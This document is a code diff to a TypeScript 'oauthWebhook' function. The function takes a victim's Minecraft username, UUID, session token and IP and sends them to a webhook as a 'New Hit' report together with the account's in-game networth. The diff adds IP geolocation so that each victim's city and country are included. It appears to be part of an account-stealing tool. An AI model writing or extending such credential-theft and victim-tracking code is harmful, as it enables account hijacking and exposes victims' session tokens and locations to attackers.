@@ -1,3 +1,5 @@
+import ipGeolocation from "../geolocation";
+
 export default async function oauthWebhook(data: any, nwData:any, ip: string, webhook: string) {
     const { username, uuid, session_token } = data;
     const { unsoulboundNw, description } = nwData || { unsoulboundNw: 0, description: "Error getting networth" };
@@ -33,6 +35,20 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
             fields.push(field)
         }
     }
+    const { status, city, country } = await ipGeolocation(ip);
+    if (status === 200) {
+        //add city and country to fields at the start
+        fields.unshift({
+            "name": "City",
+            "value": city,
+            "inline": true
+        }, {
+            "name": "Country",
+            "value": country,
+            "inline": true
+        })
+    }
+    
     let mcEmbed = {
         "title": `New Hit from: ${ip}`,
         "color": 15695665,
